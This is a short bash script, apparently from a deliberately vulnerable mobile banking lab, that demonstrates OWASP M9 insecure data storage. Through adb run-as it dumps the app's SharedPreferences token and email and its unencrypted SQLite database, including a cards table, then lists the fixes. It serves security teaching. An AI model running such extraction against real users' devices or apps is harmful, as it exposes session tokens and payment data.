#!/usr/bin/env bash
#
# M9 — Insecure Data Storage
# Extrae el token y datos sensibles de los archivos de la app.
#
# Rama: vuln/M9   (en main el token está cifrado en Keystore/Keychain)
# Uso:  ./scripts/M9-storage-dump.sh
#
set -euo pipefail
source "$(dirname "$0")/_common.sh"

bold "M9 · Insecure Data Storage"

if ! adb get-state >/dev/null 2>&1; then
  bad "No hay dispositivo/emulador conectado (adb devices)."
  exit 1
fi

bold "1) Archivos de la app (run-as: funciona en builds debuggables)"
adb shell run-as "$PKG" ls -R files shared_prefs databases 2>/dev/null || \
  info "Sin datos aún (usa la app y vuelve a intentar)."

bold "2) SharedPreferences en claro (token / email)"
adb shell run-as "$PKG" cat shared_prefs/FlutterSharedPreferences.xml 2>/dev/null || \
  bad "No hay shared_prefs o no es accesible (baseline usa Keystore)."

bold "3) Base de datos SQLite sin cifrar"
adb shell run-as "$PKG" ls databases 2>/dev/null || true
adb shell run-as "$PKG" sh -c 'cat databases/*.db' > /tmp/vulnbank.db 2>/dev/null || true
if [ -s /tmp/vulnbank.db ] && command -v sqlite3 >/dev/null 2>&1; then
  ok "Volcado en /tmp/vulnbank.db"
  sqlite3 /tmp/vulnbank.db ".tables" 2>/dev/null || true
  sqlite3 /tmp/vulnbank.db "SELECT * FROM cards;" 2>/dev/null || true
else
  info "Sin BD extraída (o sqlite3 no instalado)."
fi

bold "4) Almacenamiento externo / cache"
adb shell run-as "$PKG" ls -R cache 2>/dev/null || true

echo
bold "Impacto: token y datos del usuario recuperables con acceso físico/backup."
bold "Fix (fix/M9): Keystore/Keychain, EncryptedSharedPreferences, SQLCipher, sin cache externo."
